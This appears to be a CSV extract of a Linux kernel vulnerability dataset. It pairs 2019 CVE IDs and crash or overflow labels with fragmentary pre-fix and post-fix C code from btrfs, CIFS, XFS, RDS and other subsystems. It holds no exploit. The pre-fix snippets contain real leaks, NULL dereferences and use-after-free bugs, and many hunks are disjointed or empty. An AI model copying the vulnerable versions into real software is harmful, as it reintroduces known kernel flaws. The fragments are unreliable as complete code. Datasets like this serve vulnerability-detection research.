 list_for_each_entry(dev, &fs_devices->devices, dev_list) {
 if (dev->devid == devid &&
		    (!uuid || !memcmp(dev->uuid, uuid, BTRFS_UUID_SIZE))) {
 return dev;
		}
	}
 return NULL;
}

static noinline struct btrfs_fs_devices *find_fsid(
 const u8 *fsid, const u8 *metadata_fsid)
{
		device = NULL;
	} else {
 mutex_lock(&fs_devices->device_list_mutex);
		device = find_device(fs_devices, devid,
				disk_super->dev_item.uuid);

 /*
		 * If this disk has been pulled into an fs devices created by
	dev_uuid = disk_super->dev_item.uuid;
 if (btrfs_fs_incompat(fs_info, METADATA_UUID))
		device = btrfs_find_device(fs_info->fs_devices, devid, dev_uuid,
					   disk_super->metadata_uuid);
 else
		device = btrfs_find_device(fs_info->fs_devices, devid, dev_uuid,
					   disk_super->fsid);

 brelse(bh);
 if (!device)

 if (devid) {
		device = btrfs_find_device(fs_info->fs_devices, devid, NULL,
 NULL);
 if (!device)
 return ERR_PTR(-ENOENT);
 return device;
 read_extent_buffer(leaf, fs_uuid, btrfs_device_fsid(dev_item),
				   BTRFS_FSID_SIZE);
		device = btrfs_find_device(fs_info->fs_devices, devid, dev_uuid,
					   fs_uuid);
 BUG_ON(!device); /* Logic error */

 if (device->fs_devices->seeding) {
 return BLK_STS_OK;
}










struct btrfs_device *btrfs_find_device(struct btrfs_fs_devices *fs_devices,
				       u64 devid, u8 *uuid, u8 *fsid)

{
 struct btrfs_device *device;

 while (fs_devices) {
 if (!fsid ||
		    !memcmp(fs_devices->metadata_uuid, fsid, BTRFS_FSID_SIZE)) {
			device = find_device(fs_devices, devid, uuid);
 if (device)
 return device;




		}
		fs_devices = fs_devices->seed;



	}
 return NULL;
}
 btrfs_stripe_dev_uuid_nr(chunk, i),
				   BTRFS_UUID_SIZE);
		map->stripes[i].dev = btrfs_find_device(fs_info->fs_devices,
							devid, uuid, NULL);
 if (!map->stripes[i].dev &&
		    !btrfs_test_opt(fs_info, DEGRADED)) {
 free_extent_map(em);
	}

	device = btrfs_find_device(fs_info->fs_devices, devid, dev_uuid,
				   fs_uuid);
 if (!device) {
 if (!btrfs_test_opt(fs_info, DEGRADED)) {
 btrfs_report_missing_device(fs_info, devid,
 int i;

 mutex_lock(&fs_devices->device_list_mutex);
	dev = btrfs_find_device(fs_info->fs_devices, stats->devid, NULL, NULL);

 mutex_unlock(&fs_devices->device_list_mutex);

 if (!dev) {
	}

 /* Make sure no dev extent is beyond device bondary */
	dev = btrfs_find_device(fs_info->fs_devices, devid, NULL, NULL);
 if (!dev) {
 btrfs_err(fs_info, ""failed to find devid %llu"", devid);
		ret = -EUCLEAN;

 /* It's possible this device is a dummy for seed device */
 if (dev->disk_total_bytes == 0) {
		dev = find_device(fs_info->fs_devices->seed, devid, NULL);

 if (!dev) {
 btrfs_err(fs_info, ""failed to find seed devid %llu"",
				  devid);
int btrfs_grow_device(struct btrfs_trans_handle *trans,
 struct btrfs_device *device, u64 new_size);
struct btrfs_device *btrfs_find_device(struct btrfs_fs_devices *fs_devices,
				       u64 devid, u8 *uuid, u8 *fsid);
int btrfs_shrink_device(struct btrfs_device *device, u64 new_size);
int btrfs_init_new_device(struct btrfs_fs_info *fs_info, const char *path);
int btrfs_balance(struct btrfs_fs_info *fs_info,
"," case BTRFS_IOCTL_DEV_REPLACE_STATE_STARTED:
 case BTRFS_IOCTL_DEV_REPLACE_STATE_SUSPENDED:
		dev_replace->srcdev = btrfs_find_device(fs_info->fs_devices,
						src_devid, NULL, NULL, true);
		dev_replace->tgtdev = btrfs_find_device(fs_info->fs_devices,
							BTRFS_DEV_REPLACE_DEVID,
 NULL, NULL, true);
 /*
		 * allow 'btrfs dev replace_cancel' if src/tgt device is
		 * missing
 btrfs_info(fs_info, ""resizing devid %llu"", devid);
	}

	device = btrfs_find_device(fs_info->fs_devices, devid, NULL, NULL, true);
 if (!device) {
 btrfs_info(fs_info, ""resizer unable to find device %llu"",
			   devid);

 rcu_read_lock();
	dev = btrfs_find_device(fs_info->fs_devices, di_args->devid, s_uuid,
 NULL, true);

 if (!dev) {
		ret = -ENODEV;
 return PTR_ERR(sctx);

 mutex_lock(&fs_info->fs_devices->device_list_mutex);
	dev = btrfs_find_device(fs_info->fs_devices, devid, NULL, NULL, true);
 if (!dev || (test_bit(BTRFS_DEV_STATE_MISSING, &dev->dev_state) &&
		     !is_dev_replace)) {
 mutex_unlock(&fs_info->fs_devices->device_list_mutex);
 struct scrub_ctx *sctx = NULL;

 mutex_lock(&fs_info->fs_devices->device_list_mutex);
	dev = btrfs_find_device(fs_info->fs_devices, devid, NULL, NULL, true);
 if (dev)
		sctx = dev->scrub_ctx;
 if (sctx)
 return dev;
}






















static noinline struct btrfs_fs_devices *find_fsid(
 const u8 *fsid, const u8 *metadata_fsid)
{
		device = NULL;
	} else {
 mutex_lock(&fs_devices->device_list_mutex);
		device = btrfs_find_device(fs_devices, devid,
				disk_super->dev_item.uuid, NULL, false);

 /*
		 * If this disk has been pulled into an fs devices created by
	dev_uuid = disk_super->dev_item.uuid;
 if (btrfs_fs_incompat(fs_info, METADATA_UUID))
		device = btrfs_find_device(fs_info->fs_devices, devid, dev_uuid,
					   disk_super->metadata_uuid, true);
 else
		device = btrfs_find_device(fs_info->fs_devices, devid, dev_uuid,
					   disk_super->fsid, true);

 brelse(bh);
 if (!device)

 if (devid) {
		device = btrfs_find_device(fs_info->fs_devices, devid, NULL,
 NULL, true);
 if (!device)
 return ERR_PTR(-ENOENT);
 return device;
 read_extent_buffer(leaf, fs_uuid, btrfs_device_fsid(dev_item),
				   BTRFS_FSID_SIZE);
		device = btrfs_find_device(fs_info->fs_devices, devid, dev_uuid,
					   fs_uuid, true);
 BUG_ON(!device); /* Logic error */

 if (device->fs_devices->seeding) {
 return BLK_STS_OK;
}

/*
 * Find a device specified by @devid or @uuid in the list of @fs_devices, or
 * return NULL.
 *
 * If devid and uuid are both specified, the match must be exact, otherwise
 * only devid is used.
 *
 * If @seed is true, traverse through the seed devices.
 */
struct btrfs_device *btrfs_find_device(struct btrfs_fs_devices *fs_devices,
				       u64 devid, u8 *uuid, u8 *fsid,
 bool seed)
{
 struct btrfs_device *device;

 while (fs_devices) {
 if (!fsid ||
		    !memcmp(fs_devices->metadata_uuid, fsid, BTRFS_FSID_SIZE)) {
 list_for_each_entry(device, &fs_devices->devices,
					    dev_list) {
 if (device->devid == devid &&
				    (!uuid || memcmp(device->uuid, uuid,
						     BTRFS_UUID_SIZE) == 0))
 return device;
			}
		}
 if (seed)
			fs_devices = fs_devices->seed;
 else
 return NULL;
	}
 return NULL;
}
 btrfs_stripe_dev_uuid_nr(chunk, i),
				   BTRFS_UUID_SIZE);
		map->stripes[i].dev = btrfs_find_device(fs_info->fs_devices,
							devid, uuid, NULL, true);
 if (!map->stripes[i].dev &&
		    !btrfs_test_opt(fs_info, DEGRADED)) {
 free_extent_map(em);
	}

	device = btrfs_find_device(fs_info->fs_devices, devid, dev_uuid,
				   fs_uuid, true);
 if (!device) {
 if (!btrfs_test_opt(fs_info, DEGRADED)) {
 btrfs_report_missing_device(fs_info, devid,
 int i;

 mutex_lock(&fs_devices->device_list_mutex);
	dev = btrfs_find_device(fs_info->fs_devices, stats->devid, NULL, NULL,
 true);
 mutex_unlock(&fs_devices->device_list_mutex);

 if (!dev) {
	}

 /* Make sure no dev extent is beyond device bondary */
	dev = btrfs_find_device(fs_info->fs_devices, devid, NULL, NULL, true);
 if (!dev) {
 btrfs_err(fs_info, ""failed to find devid %llu"", devid);
		ret = -EUCLEAN;

 /* It's possible this device is a dummy for seed device */
 if (dev->disk_total_bytes == 0) {
		dev = btrfs_find_device(fs_info->fs_devices->seed, devid, NULL,
 NULL, false);
 if (!dev) {
 btrfs_err(fs_info, ""failed to find seed devid %llu"",
				  devid);
int btrfs_grow_device(struct btrfs_trans_handle *trans,
 struct btrfs_device *device, u64 new_size);
struct btrfs_device *btrfs_find_device(struct btrfs_fs_devices *fs_devices,
				       u64 devid, u8 *uuid, u8 *fsid, bool seed);
int btrfs_shrink_device(struct btrfs_device *device, u64 new_size);
int btrfs_init_new_device(struct btrfs_fs_info *fs_info, const char *path);
int btrfs_balance(struct btrfs_fs_info *fs_info,
"
2019,,CVE-2019-18814,,
2019,DoS ,CVE-2019-18813,,
2019,DoS ,CVE-2019-18812," */
	dentry = file->f_path.dentry;
 if (strcmp(dentry->d_name.name, ""ipc_flood_count"") &&
 strcmp(dentry->d_name.name, ""ipc_flood_duration_ms""))
 return -EINVAL;



 if (!strcmp(dentry->d_name.name, ""ipc_flood_duration_ms""))
		flood_duration_test = true;
"," */
	dentry = file->f_path.dentry;
 if (strcmp(dentry->d_name.name, ""ipc_flood_count"") &&
 strcmp(dentry->d_name.name, ""ipc_flood_duration_ms"")) {
		ret = -EINVAL;
 goto out;
	}

 if (!strcmp(dentry->d_name.name, ""ipc_flood_duration_ms""))
		flood_duration_test = true;
"
2019,DoS ,CVE-2019-18811," else
		err = sof_get_ctrl_copy_params(cdata->type, partdata, cdata,
					       sparams);
 if (err < 0)

 return err;


	msg_bytes = sparams->msg_bytes;
	pl_size = sparams->pl_size;
"," else
		err = sof_get_ctrl_copy_params(cdata->type, partdata, cdata,
					       sparams);
 if (err < 0) {
 kfree(partdata);
 return err;
	}

	msg_bytes = sparams->msg_bytes;
	pl_size = sparams->pl_size;
"
2019,DoS ,CVE-2019-18810,,
2019,DoS ,CVE-2019-18809," else if (reply == 0x02)
		*cold = 0;
 else
 return -EIO;
 deb_info(""Identify state cold = %d\n"", *cold);


err:
 kfree(buf);
"," else if (reply == 0x02)
		*cold = 0;
 else
		ret = -EIO;
 if (!ret)
 deb_info(""Identify state cold = %d\n"", *cold);

err:
 kfree(buf);
"
2019,DoS ,CVE-2019-18808,"			       LSB_ITEM_SIZE);
 break;
 default:

			ret = -EINVAL;
 goto e_ctx;
		}

 memset(&hmac_cmd, 0, sizeof(hmac_cmd));
","			       LSB_ITEM_SIZE);
 break;
 default:
 kfree(hmac_buf);
			ret = -EINVAL;
 goto e_data;
		}

 memset(&hmac_cmd, 0, sizeof(hmac_cmd));
"
2019,DoS ,CVE-2019-18807,,
2019,DoS ,CVE-2019-18806,,
2019,DoS Overflow ,CVE-2019-18805,,
2019,#NAME?,CVE-2019-18786,,
2019,,CVE-2019-18683,,
2019,DoS ,CVE-2019-18680,"	}
 spin_unlock_irq(&rds_tcp_conn_lock);
 list_for_each_entry_safe(tc, _tc, &tmp_list, t_tcp_node) {
		sk = tc->t_sock->sk;
		sk->sk_prot->disconnect(sk, 0);
 tcp_done(sk);


 if (tc->conn->c_passive)
 rds_conn_destroy(tc->conn->c_passive);
 rds_conn_destroy(tc->conn);
","	}
 spin_unlock_irq(&rds_tcp_conn_lock);
 list_for_each_entry_safe(tc, _tc, &tmp_list, t_tcp_node) {
 if (tc->t_sock) {
			sk = tc->t_sock->sk;
			sk->sk_prot->disconnect(sk, 0);
 tcp_done(sk);
		}
 if (tc->conn->c_passive)
 rds_conn_destroy(tc->conn->c_passive);
 rds_conn_destroy(tc->conn);
"
2019,Overflow ,CVE-2019-18675,,
2019,#NAME?,CVE-2019-18660,,
2020,#NAME?,CVE-2019-18282,,
2019,,CVE-2019-18198," return false;

suppress_route:
 ip6_rt_put(rt);

 return true;
}

ksft_skip=4

# all tests in this script. Can be overridden with -t option
TESTS=""unregister down carrier nexthop ipv6_rt ipv4_rt ipv6_addr_metric ipv4_addr_metric ipv6_route_metrics ipv4_route_metrics ipv4_route_v6_gw rp_filter""

VERBOSE=0
PAUSE_ON_FAIL=no
	cleanup
}















################################################################################
# Tests on route add and replace

	fib_carrier_test|carrier)	fib_carrier_test;;
	fib_rp_filter_test|rp_filter)	fib_rp_filter_test;;
	fib_nexthop_test|nexthop)	fib_nexthop_test;;

	ipv6_route_test|ipv6_rt)	ipv6_route_test;;
	ipv4_route_test|ipv4_rt)	ipv4_route_test;;
	ipv6_addr_metric)		ipv6_addr_metric_test;;
"," return false;

suppress_route:
 if (!(arg->flags & FIB_LOOKUP_NOREF))
 ip6_rt_put(rt);
 return true;
}

ksft_skip=4

# all tests in this script. Can be overridden with -t option
TESTS=""unregister down carrier nexthop suppress ipv6_rt ipv4_rt ipv6_addr_metric ipv4_addr_metric ipv6_route_metrics ipv4_route_metrics ipv4_route_v6_gw rp_filter""

VERBOSE=0
PAUSE_ON_FAIL=no
	cleanup
}

fib_suppress_test()
{
 $IP link add dummy1 type dummy
 $IP link set dummy1 up
 $IP -6 route add default dev dummy1
 $IP -6 rule add table main suppress_prefixlength 0
	ping -f -c 1000 -W 1 1234::1 || true
 $IP -6 rule del table main suppress_prefixlength 0
 $IP link del dummy1

 # If we got here without crashing, we're good.
 return 0
}

################################################################################
# Tests on route add and replace

	fib_carrier_test|carrier)	fib_carrier_test;;
	fib_rp_filter_test|rp_filter)	fib_rp_filter_test;;
	fib_nexthop_test|nexthop)	fib_nexthop_test;;
	fib_suppress_test|suppress)	fib_suppress_test;;
	ipv6_route_test|ipv6_rt)	ipv6_route_test;;
	ipv4_route_test|ipv4_rt)	ipv4_route_test;;
	ipv6_addr_metric)		ipv6_addr_metric_test;;
"
2019,Overflow ,CVE-2019-17666,,
2019,DoS ,CVE-2019-17351,"				state = reserve_additional_memory();
		}

 if (credit < 0)
			state = decrease_reservation(-credit, GFP_BALLOON);








		state = update_schedule(state);

		}
	}




	st = decrease_reservation(nr_pages, GFP_USER);
 if (st != BP_DONE)
 return -ENOMEM;
	balloon_stats.schedule_delay = 1;
	balloon_stats.max_schedule_delay = 32;
	balloon_stats.retry_count = 1;
	balloon_stats.max_retry_count = RETRY_UNLIMITED;

#ifdef CONFIG_XEN_BALLOON_MEMORY_HOTPLUG
 set_online_page_callback(&xen_online_page);
","				state = reserve_additional_memory();
		}

 if (credit < 0) {
 long n_pages;

			n_pages = min(-credit, si_mem_available());
			state = decrease_reservation(n_pages, GFP_BALLOON);
 if (state == BP_DONE && n_pages != -credit &&
			    n_pages < totalreserve_pages)
				state = BP_EAGAIN;
		}

		state = update_schedule(state);

		}
	}

 if (si_mem_available() < nr_pages)
 return -ENOMEM;

	st = decrease_reservation(nr_pages, GFP_USER);
 if (st != BP_DONE)
 return -ENOMEM;
	balloon_stats.schedule_delay = 1;
	balloon_stats.max_schedule_delay = 32;
	balloon_stats.retry_count = 1;
	balloon_stats.max_retry_count = 4;

#ifdef CONFIG_XEN_BALLOON_MEMORY_HOTPLUG
 set_online_page_callback(&xen_online_page);
"
2019,Overflow ,CVE-2019-17133,,
2019,DoS ,CVE-2019-17075,,
2019,,CVE-2019-17056,,
2019,,CVE-2019-17055,,
2019,,CVE-2019-17054,,
2019,,CVE-2019-17053,,
2019,,CVE-2019-17052,,
2019,DoS ,CVE-2019-16995,"
	res = hsr_add_port(hsr, hsr_dev, HSR_PT_MASTER);
 if (res)
 return res;

	res = register_netdevice(hsr_dev);
 if (res)
fail:
 hsr_for_each_port(hsr, port)
 hsr_del_port(port);



 return res;
}
 return 0;
}














/* Allocate an hsr_node and add it to node_db. 'addr' is the node's AddressA;
 * seq_out is used to initialize filtering of outgoing duplicate frames

struct hsr_node;


struct hsr_node *hsr_add_node(struct list_head *node_db, unsigned char addr[],
			      u16 seq_out);
struct hsr_node *hsr_get_node(struct hsr_port *port, struct sk_buff *skb,
","
	res = hsr_add_port(hsr, hsr_dev, HSR_PT_MASTER);
 if (res)
 goto err_add_port;

	res = register_netdevice(hsr_dev);
 if (res)
fail:
 hsr_for_each_port(hsr, port)
 hsr_del_port(port);
err_add_port:
 hsr_del_node(&hsr->self_node_db);

 return res;
}
 return 0;
}

void hsr_del_node(struct list_head *self_node_db)
{
 struct hsr_node *node;

 rcu_read_lock();
	node = list_first_or_null_rcu(self_node_db, struct hsr_node, mac_list);
 rcu_read_unlock();
 if (node) {
 list_del_rcu(&node->mac_list);
 kfree(node);
	}
}

/* Allocate an hsr_node and add it to node_db. 'addr' is the node's AddressA;
 * seq_out is used to initialize filtering of outgoing duplicate frames

struct hsr_node;

void hsr_del_node(struct list_head *self_node_db);
struct hsr_node *hsr_add_node(struct list_head *node_db, unsigned char addr[],
			      u16 seq_out);
struct hsr_node *hsr_get_node(struct hsr_port *port, struct sk_buff *skb,
"
2019,DoS ,CVE-2019-16994,"
err_reg_dev:
 ipip6_dev_free(sitn->fb_tunnel_dev);

err_alloc_dev:
 return err;
}
","
err_reg_dev:
 ipip6_dev_free(sitn->fb_tunnel_dev);
 free_netdev(sitn->fb_tunnel_dev);
err_alloc_dev:
 return err;
}
"
2019,#NAME?,CVE-2019-16921,"{
 int ret = 0;
 struct hns_roce_ucontext *context;
 struct hns_roce_ib_alloc_ucontext_resp resp;
 struct hns_roce_dev *hr_dev = to_hr_dev(ib_dev);

	resp.qp_tab_size = hr_dev->caps.num_qps;
","{
 int ret = 0;
 struct hns_roce_ucontext *context;
 struct hns_roce_ib_alloc_ucontext_resp resp = {};
 struct hns_roce_dev *hr_dev = to_hr_dev(ib_dev);

	resp.qp_tab_size = hr_dev->caps.num_qps;
"
2019,Overflow ,CVE-2019-16746,,
2019,#NAME?,CVE-2019-16714,"/*
 * Copyright (c) 2006, 2018 Oracle and/or its affiliates. All rights reserved.
 *
 * This software is available to you under a choice of one of two
 * licenses.  You may choose to be licensed under the terms of the GNU

	minfo6.seq = be64_to_cpu(inc->i_hdr.h_sequence);
	minfo6.len = be32_to_cpu(inc->i_hdr.h_len);


 if (flip) {
		minfo6.laddr = *daddr;
		minfo6.fport = inc->i_hdr.h_dport;
	}



 rds_info_copy(iter, &minfo6, sizeof(minfo6));
}
#endif
","/*
 * Copyright (c) 2006, 2019 Oracle and/or its affiliates. All rights reserved.
 *
 * This software is available to you under a choice of one of two
 * licenses.  You may choose to be licensed under the terms of the GNU

	minfo6.seq = be64_to_cpu(inc->i_hdr.h_sequence);
	minfo6.len = be32_to_cpu(inc->i_hdr.h_len);
	minfo6.tos = inc->i_conn->c_tos;

 if (flip) {
		minfo6.laddr = *daddr;
		minfo6.fport = inc->i_hdr.h_dport;
	}

	minfo6.flags = 0;

 rds_info_copy(iter, &minfo6, sizeof(minfo6));
}
#endif
"
2019,DoS ,CVE-2019-16413,,
2019,,CVE-2019-16234,,
2019,,CVE-2019-16233,,
2019,,CVE-2019-16232,,
2019,,CVE-2019-16231,,
2019,,CVE-2019-16230,,
2019,,CVE-2019-16229,,
2019,,CVE-2019-16089,,
2019,,CVE-2019-15927,,
2019,,CVE-2019-15926,,
2019,,CVE-2019-15925,,
2019,,CVE-2019-15924," /* create driver workqueue */
	fm10k_workqueue = alloc_workqueue(""%s"", WQ_MEM_RECLAIM, 0,
					  fm10k_driver_name);



 fm10k_dbg_init();

"," /* create driver workqueue */
	fm10k_workqueue = alloc_workqueue(""%s"", WQ_MEM_RECLAIM, 0,
					  fm10k_driver_name);
 if (!fm10k_workqueue)
 return -ENOMEM;

 fm10k_dbg_init();

"
2019,,CVE-2019-15923,"		disk->queue = blk_mq_init_sq_queue(&cd->tag_set, &pcd_mq_ops,
 1, BLK_MQ_F_SHOULD_MERGE);
 if (IS_ERR(disk->queue)) {

			disk->queue = NULL;
 continue;
		}

 printk(""%s: No CD-ROM drive found\n"", name);
 for (unit = 0, cd = pcd; unit < PCD_UNITS; unit++, cd++) {


 blk_cleanup_queue(cd->disk->queue);
		cd->disk->queue = NULL;
 blk_mq_free_tag_set(&cd->tag_set);
 pcd_probe_capabilities();

 if (register_blkdev(major, name)) {
 for (unit = 0, cd = pcd; unit < PCD_UNITS; unit++, cd++)





 put_disk(cd->disk);

 return -EBUSY;
	}

 int unit;

 for (unit = 0, cd = pcd; unit < PCD_UNITS; unit++, cd++) {



 if (cd->present) {
 del_gendisk(cd->disk);
 pi_release(cd->pi);
","		disk->queue = blk_mq_init_sq_queue(&cd->tag_set, &pcd_mq_ops,
 1, BLK_MQ_F_SHOULD_MERGE);
 if (IS_ERR(disk->queue)) {
 put_disk(disk);
			disk->queue = NULL;
 continue;
		}

 printk(""%s: No CD-ROM drive found\n"", name);
 for (unit = 0, cd = pcd; unit < PCD_UNITS; unit++, cd++) {
 if (!cd->disk)
 continue;
 blk_cleanup_queue(cd->disk->queue);
		cd->disk->queue = NULL;
 blk_mq_free_tag_set(&cd->tag_set);
 pcd_probe_capabilities();

 if (register_blkdev(major, name)) {
 for (unit = 0, cd = pcd; unit < PCD_UNITS; unit++, cd++) {
 if (!cd->disk)
 continue;

 blk_cleanup_queue(cd->disk->queue);
 blk_mq_free_tag_set(&cd->tag_set);
 put_disk(cd->disk);
		}
 return -EBUSY;
	}

 int unit;

 for (unit = 0, cd = pcd; unit < PCD_UNITS; unit++, cd++) {
 if (!cd->disk)
 continue;

 if (cd->present) {
 del_gendisk(cd->disk);
 pi_release(cd->pi);
"
2019,,CVE-2019-15922,"
 printk(""%s: No ATAPI disk detected\n"", name);
 for (pf = units, unit = 0; unit < PF_UNITS; pf++, unit++) {


 blk_cleanup_queue(pf->disk->queue);
		pf->disk->queue = NULL;
 blk_mq_free_tag_set(&pf->tag_set);
	pf_busy = 0;

 if (register_blkdev(major, name)) {
 for (pf = units, unit = 0; unit < PF_UNITS; pf++, unit++)




 put_disk(pf->disk);

 return -EBUSY;
	}

 int unit;
 unregister_blkdev(major, name);
 for (pf = units, unit = 0; unit < PF_UNITS; pf++, unit++) {



 if (pf->present)
 del_gendisk(pf->disk);

","
 printk(""%s: No ATAPI disk detected\n"", name);
 for (pf = units, unit = 0; unit < PF_UNITS; pf++, unit++) {
 if (!pf->disk)
 continue;
 blk_cleanup_queue(pf->disk->queue);
		pf->disk->queue = NULL;
 blk_mq_free_tag_set(&pf->tag_set);
	pf_busy = 0;

 if (register_blkdev(major, name)) {
 for (pf = units, unit = 0; unit < PF_UNITS; pf++, unit++) {
 if (!pf->disk)
 continue;
 blk_cleanup_queue(pf->disk->queue);
 blk_mq_free_tag_set(&pf->tag_set);
 put_disk(pf->disk);
		}
 return -EBUSY;
	}

 int unit;
 unregister_blkdev(major, name);
 for (pf = units, unit = 0; unit < PF_UNITS; pf++, unit++) {
 if (!pf->disk)
 continue;

 if (pf->present)
 del_gendisk(pf->disk);

"
2019,,CVE-2019-15921,"			       start, end + 1, GFP_KERNEL);
 if (family->id < 0) {
		err = family->id;
 goto errout_locked;
	}

	err = genl_validate_assign_mc_groups(family);

errout_remove:
 idr_remove(&genl_fam_idr, family->id);

 kfree(family->attrbuf);
errout_locked:
 genl_unlock_all();
","			       start, end + 1, GFP_KERNEL);
 if (family->id < 0) {
		err = family->id;
 goto errout_free;
	}

	err = genl_validate_assign_mc_groups(family);

errout_remove:
 idr_remove(&genl_fam_idr, family->id);
errout_free:
 kfree(family->attrbuf);
errout_locked:
 genl_unlock_all();
"
2019,,CVE-2019-15920,"	rqst.rq_nvec = 1;

	rc = cifs_send_recv(xid, ses, &rqst, &resp_buftype, flags, &rsp_iov);
 cifs_small_buf_release(req);

	rsp = (struct smb2_read_rsp *)rsp_iov.iov_base;

 if (rc) {
				    io_parms->tcon->tid, ses->Suid,
				    io_parms->offset, io_parms->length);



	*nbytes = le32_to_cpu(rsp->DataLength);
 if ((*nbytes > CIFS_MAX_MSGSIZE) ||
	    (*nbytes > io_parms->length)) {
","	rqst.rq_nvec = 1;

	rc = cifs_send_recv(xid, ses, &rqst, &resp_buftype, flags, &rsp_iov);


	rsp = (struct smb2_read_rsp *)rsp_iov.iov_base;

 if (rc) {
				    io_parms->tcon->tid, ses->Suid,
				    io_parms->offset, io_parms->length);

 cifs_small_buf_release(req);

	*nbytes = le32_to_cpu(rsp->DataLength);
 if ((*nbytes > CIFS_MAX_MSGSIZE) ||
	    (*nbytes > io_parms->length)) {
"
2019,,CVE-2019-15919,"
	rc = cifs_send_recv(xid, io_parms->tcon->ses, &rqst,
			    &resp_buftype, flags, &rsp_iov);
 cifs_small_buf_release(req);
	rsp = (struct smb2_write_rsp *)rsp_iov.iov_base;

 if (rc) {
				     io_parms->offset, *nbytes);
	}


 free_rsp_buf(resp_buftype, rsp);
 return rc;
}
","
	rc = cifs_send_recv(xid, io_parms->tcon->ses, &rqst,
			    &resp_buftype, flags, &rsp_iov);

	rsp = (struct smb2_write_rsp *)rsp_iov.iov_base;

 if (rc) {
				     io_parms->offset, *nbytes);
	}

 cifs_small_buf_release(req);
 free_rsp_buf(resp_buftype, rsp);
 return rc;
}
"
2019,,CVE-2019-15918,"		} else if (rsp->DialectRevision == cpu_to_le16(SMB21_PROT_ID)) {
 /* ops set to 3.0 by default for default so update */
			ses->server->ops = &smb21_operations;
		} else if (rsp->DialectRevision == cpu_to_le16(SMB311_PROT_ID))

			ses->server->ops = &smb311_operations;


	} else if (le16_to_cpu(rsp->DialectRevision) !=
				ses->server->vals->protocol_id) {
 /* if requested single dialect ensure returned dialect matched */
","		} else if (rsp->DialectRevision == cpu_to_le16(SMB21_PROT_ID)) {
 /* ops set to 3.0 by default for default so update */
			ses->server->ops = &smb21_operations;
			ses->server->vals = &smb21_values;
		} else if (rsp->DialectRevision == cpu_to_le16(SMB311_PROT_ID)) {
			ses->server->ops = &smb311_operations;
			ses->server->vals = &smb311_values;
		}
	} else if (le16_to_cpu(rsp->DialectRevision) !=
				ses->server->vals->protocol_id) {
 /* if requested single dialect ensure returned dialect matched */
"
2019,,CVE-2019-15917," return -EPROTONOSUPPORT;

	hu->proto = p;
 set_bit(HCI_UART_PROTO_READY, &hu->flags);

	err = hci_uart_register_dev(hu);
 if (err) {
 clear_bit(HCI_UART_PROTO_READY, &hu->flags);
 return err;
	}


 return 0;
}

"," return -EPROTONOSUPPORT;

	hu->proto = p;


	err = hci_uart_register_dev(hu);
 if (err) {

 return err;
	}

 set_bit(HCI_UART_PROTO_READY, &hu->flags);
 return 0;
}

"
2019,DoS ,CVE-2019-15916,,
2019,#NAME?,CVE-2019-15902,,
2019,DoS ,CVE-2019-15807,,
2020,,CVE-2019-15794,,
2020,Bypass ,CVE-2019-15793,,
2020,DoS Exec Code ,CVE-2019-15792,,
2020,,CVE-2019-15791,,
2019,DoS ,CVE-2019-15666,,
2019,,CVE-2019-15538,"
out_cancel:
 xfs_trans_cancel(tp);

out_dqrele:
 xfs_qm_dqrele(udqp);
 xfs_qm_dqrele(gdqp);
","
out_cancel:
 xfs_trans_cancel(tp);
 xfs_iunlock(ip, XFS_ILOCK_EXCL);
out_dqrele:
 xfs_qm_dqrele(udqp);
 xfs_qm_dqrele(gdqp);
"
2019,,CVE-2019-15505,,
2019,,CVE-2019-15504,,
2019,,CVE-2019-15292,,
2019,,CVE-2019-15291,,
2019,,CVE-2019-15239,,
2019,,CVE-2019-15223,,
2019,,CVE-2019-15222,,
2019,,CVE-2019-15221,,
2019,,CVE-2019-15220,,
2019,,CVE-2019-15219,,
2019,,CVE-2019-15218,,
2019,,CVE-2019-15217,,
2019,,CVE-2019-15216,,
2019,,CVE-2019-15215,,
2019,,CVE-2019-15214,,
2019,,CVE-2019-15213,,
2019,,CVE-2019-15212,,
2019,,CVE-2019-15211,,
2019,,CVE-2019-15118,,
2019,Overflow ,CVE-2019-15117,,
2019,,CVE-2019-15099,,
2019,,CVE-2019-15098,,
2019,,CVE-2019-15090,"{
 va_list va;
 struct va_format vaf;
 char nfunc[32];

 memset(nfunc, 0, sizeof(nfunc));
 memcpy(nfunc, func, sizeof(nfunc) - 1);

 va_start(va, fmt);


 if (likely(qedi) && likely(qedi->pdev))
 pr_err(""[%s]:[%s:%d]:%d: %pV"", dev_name(&qedi->pdev->dev),
 nfunc, line, qedi->host_no, &vaf);
 else
 pr_err(""[0000:00:00.0]:[%s:%d]: %pV"", nfunc, line, &vaf);

 va_end(va);
}
{
 va_list va;
 struct va_format vaf;
 char nfunc[32];

 memset(nfunc, 0, sizeof(nfunc));
 memcpy(nfunc, func, sizeof(nfunc) - 1);

 va_start(va, fmt);


 if (likely(qedi) && likely(qedi->pdev))
 pr_warn(""[%s]:[%s:%d]:%d: %pV"", dev_name(&qedi->pdev->dev),
 nfunc, line, qedi->host_no, &vaf);
 else
 pr_warn(""[0000:00:00.0]:[%s:%d]: %pV"", nfunc, line, &vaf);

ret:
 va_end(va);
{
 va_list va;
 struct va_format vaf;
 char nfunc[32];

 memset(nfunc, 0, sizeof(nfunc));
 memcpy(nfunc, func, sizeof(nfunc) - 1);

 va_start(va, fmt);


 if (likely(qedi) && likely(qedi->pdev))
 pr_notice(""[%s]:[%s:%d]:%d: %pV"",
 dev_name(&qedi->pdev->dev), nfunc, line,
			  qedi->host_no, &vaf);
 else
 pr_notice(""[0000:00:00.0]:[%s:%d]: %pV"", nfunc, line, &vaf);

ret:
 va_end(va);
{
 va_list va;
 struct va_format vaf;
 char nfunc[32];

 memset(nfunc, 0, sizeof(nfunc));
 memcpy(nfunc, func, sizeof(nfunc) - 1);

 va_start(va, fmt);


 if (likely(qedi) && likely(qedi->pdev))
 pr_info(""[%s]:[%s:%d]:%d: %pV"", dev_name(&qedi->pdev->dev),
 nfunc, line, qedi->host_no, &vaf);
 else
 pr_info(""[0000:00:00.0]:[%s:%d]: %pV"", nfunc, line, &vaf);

ret:
 va_end(va);
","{
 va_list va;
 struct va_format vaf;





 va_start(va, fmt);


 if (likely(qedi) && likely(qedi->pdev))
 pr_err(""[%s]:[%s:%d]:%d: %pV"", dev_name(&qedi->pdev->dev),
 func, line, qedi->host_no, &vaf);
 else
 pr_err(""[0000:00:00.0]:[%s:%d]: %pV"", func, line, &vaf);

 va_end(va);
}
{
 va_list va;
 struct va_format vaf;





 va_start(va, fmt);


 if (likely(qedi) && likely(qedi->pdev))
 pr_warn(""[%s]:[%s:%d]:%d: %pV"", dev_name(&qedi->pdev->dev),
 func, line, qedi->host_no, &vaf);
 else
